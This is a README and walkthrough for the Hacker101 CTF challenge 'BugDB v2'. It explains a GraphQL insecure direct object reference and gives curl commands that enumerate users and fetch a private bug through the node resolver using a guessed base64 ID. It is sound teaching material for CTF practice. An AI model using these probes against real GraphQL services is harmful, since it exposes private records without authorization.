# BugDB v2

## Overview

This directory contains the local materials and manual walkthrough for the `BugDB v2` challenge from `Hacker101 / HackerOne CTF`. The goal of this README is to make the folder immediately useful to someone reviewing the archive later: what the challenge was about, what files matter, how the solve works at a high level, and which commands to run first.

## Challenge Profile

- Challenge: `BugDB v2`
- Category: `Web, GraphQL`
- Collection: `HackerOne`
- Event or Platform: `Hacker101 / HackerOne CTF`

## Directory Contents

- `bugdb_v2_poc.sh`

## First Commands To Run

This folder does not include original challenge files. Start by reading the challenge description and the manual walkthrough below, then connect to a fresh challenge instance and reproduce the steps one by one.

```bash
cd "/home/eliah/Desktop/CTF/HackerOne/BugDB_v2"
ls -lah
printf 'Follow the manual walkthrough below against the live service.\n'
```

## Walkthrough

Challenge: BugDB v2
Platform: Hacker101 / HackerOne CTF
Category: Web, GraphQL
Difficulty shown: Easy

Target:
https://ff7015c75297ab7130039b0b26bb9faf.ctf.hacker101.com/

### What this challenge teaches

GraphQL can hide insecure direct object reference issues behind "safe-looking"
top-level queries. A list endpoint may filter private records correctly, while
a generic object fetcher like node(id: ...) still exposes the same object.

### Real-world analogy

Think of a helpdesk app that hides private tickets from the main dashboard.
That looks good in the UI, but if the backend also offers a universal
"fetch object by internal ID" function and forgets authorization there,
anyone who can guess or derive the ID can still open the private ticket.

Vulnerability summary:
1. The GraphQL schema supports Relay-style global object lookups with:
node(id: ID!)
2. Public listings do not show the victim's private bug in allBugs.
3. User and bug IDs follow a predictable base64 format:
"Users:1" -> VXNlcnM6MQ==
"Bugs:2"  -> QnVnczoy
4. Querying node(id:"QnVnczoy") returns the private bug object directly,
including its text field, which contains the flag.

Why this matters in real systems:
GraphQL resolvers need authorization checks on every path to sensitive data.
It is not enough to protect only list endpoints. Global node resolvers are
especially risky because they provide a universal access path once IDs are
known or guessable.

### Manual discovery flow

### Step 1: Confirm the GraphQL endpoint exists.

Command:
curl -s 'https://ff7015c75297ab7130039b0b26bb9faf.ctf.hacker101.com/graphql?query=%7B__typename%7D'
Reason:
This confirms the endpoint is alive and processing GraphQL queries.

### Step 2: Enumerate visible users.

Command:
curl -sG 'https://ff7015c75297ab7130039b0b26bb9faf.ctf.hacker101.com/graphql' \
--data-urlencode 'query=query{allUsers(first:10){edges{node{id username}}}}'
Reason:
This shows the known users and their global IDs. In this challenge we learn
there are admin and victim users.

### Step 3: Check the public bug list.

Command:
curl -sG 'https://ff7015c75297ab7130039b0b26bb9faf.ctf.hacker101.com/graphql' \
--data-urlencode 'query=query{allBugs{id text private reporter{username}}}'
Reason:
This shows that only the public bug is listed, which hints that a private
bug likely exists but is filtered from the list view.

### Step 4: Abuse the global node resolver with a guessed Relay ID.

Command:
curl -sG 'https://ff7015c75297ab7130039b0b26bb9faf.ctf.hacker101.com/graphql' \
--data-urlencode 'query=query{node(id:"QnVnczoy"){__typename ... on Bugs{id text private reporter{username}}}}'
Reason:
"QnVnczoy" is base64 for "Bugs:2". The node resolver returns the object even
though it is private, leaking the bug text and the flag.

Helper note:
If you want to derive the ID yourself on Linux, this command generates it:
printf 'Bugs:2' | base64

## Manual Reproduction Flow

Use the walkthrough above as the authoritative solve path. The short command block below is only the setup phase before you execute the numbered manual steps in this README.

```bash
cd "/home/eliah/Desktop/CTF/HackerOne/BugDB_v2"
ls -lah
```

## Study Notes

This folder is best used as a practical study reference for `Web, GraphQL`-style problems. Enumerate the schema and test the vulnerable query paths manually first, then use the archived solve notes only as a reference check.
